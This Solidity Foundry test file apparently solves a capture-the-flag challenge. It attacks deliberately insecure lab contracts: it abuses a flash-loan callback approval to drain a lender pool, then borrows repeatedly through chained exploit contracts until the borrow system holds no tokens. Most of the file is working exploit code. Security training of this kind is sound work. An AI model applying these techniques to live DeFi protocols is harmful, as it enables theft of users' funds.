// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import {InSecureumToken} from "../src/tokens/tokenInsecureum.sol";
import {BoringToken} from "../src/tokens/tokenBoring.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {InsecureDexLP} from "../src/Challenge2.DEX.sol";
import {IInsecureDexLP} from "../src/Challenge3.borrow_system.sol";
import {InSecureumLenderPool} from "../src/Challenge1.lenderpool.sol";
import {BorrowSystemInsecureOracle} from "../src/Challenge3.borrow_system.sol";


contract Challenge3Test is Test {
    // dex & oracle
    InsecureDexLP oracleDex;
    // flash loan
    InSecureumLenderPool flashLoanPool;
    // borrow system, contract target to break
    BorrowSystemInsecureOracle target;

    // insecureum token
    IERC20 token0;
    // boring token
    IERC20 token1;

    address player = makeAddr("player");

    function setUp() public {

        // create the tokens
        token0 = IERC20(new InSecureumToken(30000 ether));
        token1 = IERC20(new BoringToken(20000 ether));
        
        // setup dex & oracle
        oracleDex = new InsecureDexLP(address(token0),address(token1));

        token0.approve(address(oracleDex), type(uint256).max);
        token1.approve(address(oracleDex), type(uint256).max);
        oracleDex.addLiquidity(100 ether, 100 ether);

        // setup flash loan service
        flashLoanPool = new InSecureumLenderPool(address(token0));
        // send tokens to the flashloan pool
        token0.transfer(address(flashLoanPool), 10000 ether);

        // setup the target conctract
        target = new BorrowSystemInsecureOracle(address(oracleDex), address(token0), address(token1));

        // lets fund the borrow
        token0.transfer(address(target), 10000 ether);
        token1.transfer(address(target), 10000 ether);

        vm.label(address(oracleDex), "DEX");
        vm.label(address(flashLoanPool), "FlashloanPool");
        vm.label(address(token0), "InSecureumToken");
        vm.label(address(token1), "BoringToken");

    }

    function testChallenge() public {  

        vm.startPrank(player);

        /*//////////////////////////////
        //    Add your hack below!    //
        //////////////////////////////*/

        //============================//

        Exploit exploit = new Exploit();

        exploit.setAll(address(token0), address(token1), target);
      
        flashLoanPool.flashLoan(
          address(exploit),
          abi.encodeWithSignature(
            "HackFlashLoan(address)", player
          )
        );
        uint256 balance = token0.balanceOf(address(flashLoanPool));
        token0.transferFrom(address(flashLoanPool), player, balance);

        balance = token0.balanceOf(player);
        token0.approve(address(target), balance);
        target.depositToken0(balance);
        target.borrowToken0(11000 ether);

        balance = token0.balanceOf(player);
        token0.approve(player, balance);
        token0.transferFrom(player, address(exploit), balance);

        exploit.hack();

        ExploitExample exploit2 = new ExploitExample();
        exploit2.setAll(address(token0), address(token1), target);
        exploit.transferTo(address(exploit2));
        exploit2.hack(13000 ether);

        ExploitExample exploit3 = new ExploitExample();
        exploit3.setAll(address(token0), address(token1), target);
        exploit2.transferTo(address(exploit3));
        exploit3.hack(14000 ether);


        ExploitExample exploit4 = new ExploitExample();
        exploit4.setAll(address(token0), address(token1), target);
        exploit3.transferTo(address(exploit4));
        exploit4.hack(15000 ether);

        ExploitExample exploit5 = new ExploitExample();
        exploit5.setAll(address(token0), address(token1), target);
        exploit4.transferTo(address(exploit5));
        exploit5.hack(16000 ether);

        ExploitExample exploit6 = new ExploitExample();
        exploit6.setAll(address(token0), address(token1), target);
        exploit5.transferTo(address(exploit6));
        exploit6.hack(17000 ether);


        ExploitExample exploit7 = new ExploitExample();
        exploit7.setAll(address(token0), address(token1), target);
        exploit6.transferTo(address(exploit7));
        exploit7.hack(18000 ether);

        ExploitExample exploit8 = new ExploitExample();
        exploit8.setAll(address(token0), address(token1), target);
        exploit7.transferTo(address(exploit8));
        exploit8.hack(19000 ether);

        ExploitExample exploit9 = new ExploitExample();
        exploit9.setAll(address(token0), address(token1), target);
        exploit8.transferTo(address(exploit9));
        exploit9.hack(20000 ether);
        exploit9.transferTo(player);

        vm.stopPrank();

        console.log("token0 player {}", token0.balanceOf(address(player)));
        console.log("token0 exploit {}", token0.balanceOf(address(exploit)));
        console.log("token0 oracle {}", token0.balanceOf(address(target)));
        console.log("token1 player {}", token1.balanceOf(address(player)));
        console.log("token1 exploit {}", token1.balanceOf(address(exploit)));
        console.log("token1 oracle {}", token1.balanceOf(address(target)));
        assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");

    }
}

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
////////////////////////////////////////////////////////////*/

contract Exploit is IInsecureDexLP {
    IERC20 token0;
    IERC20 token1;
    BorrowSystemInsecureOracle borrowSystem;
    InsecureDexLP dex;

    address public owner;
	  mapping (address => uint256) token0Deposited;

    constructor() public payable {
        owner = msg.sender;
    }

    function setAll(address zeroToken, address firstToken, BorrowSystemInsecureOracle borrow) public payable {
        token0 = IERC20(zeroToken); 
        token1 = IERC20(firstToken);
        borrowSystem = borrow;
    }

    function HackFlashLoan(address player) public {
        token0.approve(player, token0.balanceOf(address(this)));
    }


    function hack() public {
        token0.approve(address(borrowSystem), token0.balanceOf(address(this)));
        borrowSystem.depositToken0(token0.balanceOf(address(this)));
        borrowSystem.borrowToken0(12000 ether);
    }

    function transferTo(address otherAddress) public {
        uint balance = token0.balanceOf(address(this));
        token0.approve(address(this), balance);
        token0.transferFrom(address(this), otherAddress, balance);
    }

    function calcAmountsOut(address tokenIn, uint256 amountIn) external view returns(uint256 output) {
        return 1000 ether;
    }
}


contract ExploitExample {
    IERC20 token0;
    IERC20 token1;
    BorrowSystemInsecureOracle borrowSystem;
    InsecureDexLP dex;

    address public owner;
	  mapping (address => uint256) token0Deposited;

    constructor() public payable {
        owner = msg.sender;
    }

    function setAll(address zeroToken, address firstToken, BorrowSystemInsecureOracle borrow) public payable {
        token0 = IERC20(zeroToken); 
        token1 = IERC20(firstToken);
        borrowSystem = borrow;
    }

    function hack(uint amount) public {
        token0.approve(address(borrowSystem), token0.balanceOf(address(this)));
        borrowSystem.depositToken0(token0.balanceOf(address(this)));
        borrowSystem.borrowToken0(amount);
    }

    function transferTo(address otherAddress) public {
        uint balance = token0.balanceOf(address(this));
        token0.approve(address(this), balance);
        token0.transferFrom(address(this), otherAddress, balance);
    }
}